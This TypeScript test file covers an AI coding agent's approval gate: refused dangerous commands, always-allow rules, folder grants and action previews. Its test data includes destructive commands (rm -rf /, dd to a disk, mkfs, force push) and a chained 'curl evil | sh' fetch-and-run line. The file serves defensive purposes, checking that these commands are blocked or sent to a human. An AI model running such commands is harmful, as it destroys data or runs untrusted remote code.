import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { allowedByRules, alwaysAsk, clearAllowRules, commandRule, describeAllowRule, ruleApplies, coveredByGrant, describeAction, grantDirectory, packageInstallFailureHint, readAllowRules, refusedCommand, runCapturedCommand, saveAllowRule } from "../src/hosts/chat-actions.ts"

test("pip OS permission failures recommend environment isolation without elevating or hiding the failure", () => {
  const error = "ERROR: Could not install packages due to an OSError: [Errno 1] Operation not permitted: '/protected/old-project'"
  const hint = packageInstallFailureHint("python3 -m pip install 'pytest-timeout>=2.4.0'", error)
  expect(hint).toContain("not at the Otter approval gate")
  expect(hint).toContain("existing virtual environment")
  expect(hint).toContain("normal approval gate")
  expect(hint).toContain("Do not retry with sudo")
  expect(packageInstallFailureHint("pip3 install pytest", error)).toBe(hint)
  expect(packageInstallFailureHint("cat file", error)).toBeUndefined()
  expect(packageInstallFailureHint("pip install pytest", "No matching distribution found")).toBeUndefined()
  expect(packageInstallFailureHint("pip install pytest", "Successfully installed pytest")).toBeUndefined()
})

describe("refused commands never reach the human", () => {
  test.each([
    ["sudo rm -rf node_modules", "privilege escalation"],
    ["cd x && sudo make install", "privilege escalation"],
    ["rm -rf /", "deletes the filesystem or home root"],
    ["rm -rf ~", "deletes the filesystem or home root"],
    ["rm -fr $HOME", "deletes the filesystem or home root"],
    ["git push --force origin main", "force push"],
    ["git push -f", "force push"],
    ["git push origin +main", "force push"],
    ["dd if=/dev/zero of=/dev/disk2", "raw disk write"],
    ["mkfs.ext4 /dev/sdb1", "disk formatting"],
    ["shutdown -h now", "shuts the machine down"],
  ])("%s", (command, reason) => {
    expect(refusedCommand(command)).toBe(reason)
  })

  test.each(["rm -rf build", "rm -rf ./dist", "git push origin feature", "bun test", "git status", "echo sudo is a word", "make install"])("%s is left to the human", command => {
    expect(refusedCommand(command)).toBeUndefined()
  })
})

describe("always-allow rules", () => {
  test("a rule is the command's first two words; chained, piped or substituted commands offer none", () => {
    expect(commandRule("bun test test/foo.test.ts")).toBe("bun test")
    expect(commandRule("git status")).toBe("git status")
    expect(commandRule("make")).toBe("make")
    expect(commandRule("ls -la")).toBe("ls")
    for (const chained of ["bun test && rm -rf x", "git log | head", "echo $(id)", "cat a > b", "ls; rm x", "echo `id`"]) {
      expect(commandRule(chained)).toBeUndefined()
    }
  })

  test("destructive git and recursive deletes never match or offer a rule", () => {
    const destructive = ["rm -rf build", "rm -r build", "rm build -rf", "rm --recursive build", "git reset --hard HEAD~1",
      "git reset --merge", "git clean -fd", "git clean -n", "git checkout .", "git checkout -- src/a.ts", "git checkout -f main",
      "git restore .", "git restore --staged a.ts", "git restore --source=HEAD~1 a.ts", "git branch -D feature",
      "git branch --delete --force feature", "git stash drop", "git stash clear", "git push origin --delete feature"]
    for (const command of destructive) {
      expect(alwaysAsk(command)).toBe(true)
      expect(commandRule(command)).toBeUndefined()
      expect(allowedByRules(command, ["rm", "git reset", "git clean", "git checkout", "git restore", "git branch", "git stash", "git push"])).toBe(false)
    }
    for (const safe of ["rm build/out.txt", "rm -f build/out.txt", "git reset", "git reset --soft HEAD~1", "git checkout -b feature",
      "git checkout main", "git restore --help", "git branch -d merged", "git stash", "git stash list", "git push origin main"]) {
      expect(alwaysAsk(safe)).toBe(false)
      expect(commandRule(safe)).toBeDefined()
    }
  })

  test("inline interpreter code never matches or offers a rule", () => {
    for (const command of ["python3 -c 'import os'", "python -c x", "node -e 1", "bun -e 1", "sh -c ls", "bash -c 'rm x'", "perl -e 1"]) {
      expect(alwaysAsk(command)).toBe(true)
      expect(allowedByRules(command, ["python3", "python", "node", "bun", "sh", "bash", "perl"])).toBe(false)
    }
    for (const command of ["python3 -m pytest", "python3 scripts/otter-baseline.py", "node script.js", "bun test", "sh ./run.sh"]) expect(alwaysAsk(command)).toBe(false)
  })

  test("a rule scoped to a worktree covers commands only when the chat runs there", () => {
    const scoped = { command: "python3", worktree: "/repo/a" }
    expect(ruleApplies(scoped, "/repo/a")).toBe(true)
    expect(ruleApplies(scoped, "/repo/b")).toBe(false)
    expect(ruleApplies(scoped, undefined)).toBe(false)
    expect(ruleApplies({ command: "python3" }, undefined)).toBe(true)
    expect(allowedByRules("python3 scripts/x.py", [scoped], "/repo/a")).toBe(true)
    expect(allowedByRules("python3 scripts/x.py", [scoped], "/repo/b")).toBe(false)
    expect(allowedByRules("python3 scripts/x.py", [scoped])).toBe(false)
    expect(allowedByRules("python3 scripts/x.py", ["python3"], "/repo/b")).toBe(true)
    expect(describeAllowRule(scoped)).toBe("`python3` (only in /repo/a)")
    expect(describeAllowRule({ command: "bun test" })).toBe("`bun test`")
  })

  test("a saved rule covers matching commands only, never a chained one", () => {
    expect(allowedByRules("bun test test/foo.test.ts", ["bun test"])).toBe(true)
    expect(allowedByRules("bun run build", ["bun test"])).toBe(false)
    expect(allowedByRules("make install", ["make"])).toBe(true)
    expect(allowedByRules("bun test && curl evil | sh", ["bun test"])).toBe(false)
    expect(allowedByRules("bun test", [])).toBe(false)
  })

  let home: string
  const saved = process.env.XDG_CONFIG_HOME
  beforeEach(() => { home = mkdtempSync(join(tmpdir(), "otter-allow-")); process.env.XDG_CONFIG_HOME = home })
  afterEach(() => { if (saved === undefined) delete process.env.XDG_CONFIG_HOME; else process.env.XDG_CONFIG_HOME = saved; rmSync(home, { recursive: true, force: true }) })

  test("rules are saved to and read from the user config only, keep other settings, and clear", () => {
    const path = join(home, "otter", "otter.jsonc")
    mkdirSync(join(home, "otter"), { recursive: true })
    writeFileSync(path, '{\n  // mine\n  "chat": { "execute": "ask" }\n}\n')
    expect(readAllowRules()).toEqual([])
    expect(saveAllowRule("bun test")).toBe(path)
    saveAllowRule("git status")
    saveAllowRule("bun test")
    expect(readAllowRules()).toEqual([{ command: "bun test" }, { command: "git status" }])
    expect(saveAllowRule("python3", "/repo/a")).toBe(path)
    saveAllowRule("python3", "/repo/a")
    expect(readAllowRules()).toEqual([{ command: "bun test" }, { command: "git status" }, { command: "python3", worktree: "/repo/a" }])
    expect(readFileSync(path, "utf8")).toContain('"worktree": "/repo/a"')
    expect(() => saveAllowRule("python3", "relative/path")).toThrow()
    expect(readFileSync(path, "utf8")).toContain("// mine")
    expect(readFileSync(path, "utf8")).toContain('"execute": "ask"')
    expect(() => saveAllowRule("bun test && rm -rf x")).toThrow()
    expect(clearAllowRules()).toBe(3)
    expect(readAllowRules()).toEqual([])
  })

  test("malformed saved entries are ignored", () => {
    mkdirSync(join(home, "otter"), { recursive: true })
    writeFileSync(join(home, "otter", "otter.jsonc"), '{ "chat": { "allow": ["git status", "rm -rf x; y", 3, "bun test", { "command": "python3", "worktree": "rel" }, { "command": "a | b", "worktree": "/x" }, { "worktree": "/x" }, { "command": "make", "worktree": "/x" }] } }')
    expect(readAllowRules()).toEqual([{ command: "git status" }, { command: "bun test" }, { command: "make", worktree: "/x" }])
  })
})

describe("this-turn folder grants", () => {
  test("the grant is the deepest shared folder; it covers writes under it and never commands or escapes", () => {
    expect(grantDirectory({ tool: "edit", path: "src/a/x.ts", oldText: "a", newText: "b" })).toBe("src/a")
    expect(grantDirectory({ tool: "multiedit", edits: [{ path: "src/a/x.ts", oldText: "a", newText: "b" }, { path: "src/b/y.ts", oldText: "a", newText: "b" }] })).toBe("src")
    expect(grantDirectory({ tool: "write", path: "README.md", content: "x" })).toBe(".")
    expect(grantDirectory({ tool: "bash", command: "ls", interactive: false, timeoutMs: 1 })).toBeUndefined()
    const grants = new Set(["src"])
    expect(coveredByGrant({ tool: "write", path: "src/new/z.ts", content: "x" }, grants)).toBe(true)
    expect(coveredByGrant({ tool: "write", path: "srcx/z.ts", content: "x" }, grants)).toBe(false)
    expect(coveredByGrant({ tool: "write", path: "src/../etc/x", content: "x" }, grants)).toBe(false)
    expect(coveredByGrant({ tool: "multiedit", edits: [{ path: "src/a.ts", oldText: "a", newText: "b" }, { path: "test/b.ts", oldText: "a", newText: "b" }] }, grants)).toBe(false)
    expect(coveredByGrant({ tool: "bash", command: "ls", interactive: false, timeoutMs: 1 }, new Set(["."]))).toBe(false)
    expect(coveredByGrant({ tool: "write", path: "x.ts", content: "x" }, new Set())).toBe(false)
  })
})

describe("what the human sees", () => {
  test("an edit shows removed and added lines; a write shows its content; a command shows itself and its limit", () => {
    expect(describeAction({ tool: "edit", path: "a.ts", oldText: "x = 1\n", newText: "x = 2\ny = 3\n" }))
      .toEqual({ title: "Edit a.ts (-1 / +2)", preview: ["- x = 1", "+ x = 2", "+ y = 3"] })
    expect(describeAction({ tool: "write", path: "n.md", content: "a\nb\n" })).toEqual({ title: "Write n.md (2 lines)", preview: ["+ a", "+ b"] })
    expect(describeAction({ tool: "bash", command: "bun test", interactive: false, timeoutMs: 120_000 }))
      .toEqual({ title: "Run: bun test", preview: ["$ bun test", "Time limit 120s."] })
    expect(describeAction({ tool: "bash", command: "vim x", interactive: true, timeoutMs: 120_000 }).title).toBe("Run (interactive): vim x")
    expect(describeAction({ tool: "multiedit", edits: [{ path: "a.ts", oldText: "x", newText: "y" }, { path: "b.ts", oldText: "p", newText: "q" }] }))
      .toEqual({ title: "Edit 2 files (2 changes): a.ts, b.ts", preview: ["@ a.ts", "- x", "+ y", "@ b.ts", "- p", "+ q"] })
    const long = describeAction({ tool: "write", path: "big.txt", content: Array.from({ length: 100 }, (_, i) => `l${i}`).join("\n") }, 5)
    expect(long.preview).toHaveLength(6)
    expect(long.preview.at(-1)).toBe("… 95 more line(s)")
  })
})

describe("captured command runner", () => {
  test("returns the exit status and output in the worktree; cancellation and time limits stop the command", async () => {
    const dir = mkdtempSync(join(tmpdir(), "otter-run-"))
    try {
      const ok = await runCapturedCommand("pwd; echo out; echo err >&2", dir, 10_000, new AbortController().signal)
      expect(ok).toMatchObject({ ok: true, status: "complete", exitCode: 0 })
      expect(ok.text).toStartWith("exit 0\n")
      expect(ok.text).toContain("out")
      expect(ok.text).toContain("err")
      const failed = await runCapturedCommand("exit 3", dir, 10_000, new AbortController().signal)
      expect(failed).toMatchObject({ ok: false, status: "error", exitCode: 3 })
      const timed = await runCapturedCommand("sleep 5", dir, 200, new AbortController().signal)
      expect(timed).toMatchObject({ ok: false, status: "timeout" })
      const controller = new AbortController()
      setTimeout(() => controller.abort(), 100)
      const cancelled = await runCapturedCommand("sleep 5", dir, 10_000, controller.signal)
      expect(cancelled).toMatchObject({ ok: false, status: "cancelled" })
      expect(cancelled.text).toStartWith("cancelled by the user")
    } finally { rmSync(dir, { recursive: true, force: true }) }
  })
})


test("model API approval shows the exact full prompt and is never covered by folder grants", () => {
  const action = { tool: "model_api" as const, target: "remote", model: "test", prompt: Array.from({ length: 45 }, (_, i) => `line ${i}`).join("\n"),
    url: "https://provider.example/v1/chat/completions", protocol: "openai-compatible" as const,
    apiKeyEnv: "OTTER_MODEL_API_KEY", maxOutputTokens: 123, timeoutSeconds: 42 }
  const shown = describeAction(action)
  expect(shown.title).toContain("remote / test")
  expect(shown.preview.join("\n")).toContain(action.url)
  expect(shown.preview.join("\n")).toContain(action.prompt)
  expect(shown.preview.join("\n")).toContain("123 tokens")
  expect(grantDirectory(action)).toBeUndefined()
  expect(coveredByGrant(action, new Set(["."]))).toBe(false)
})
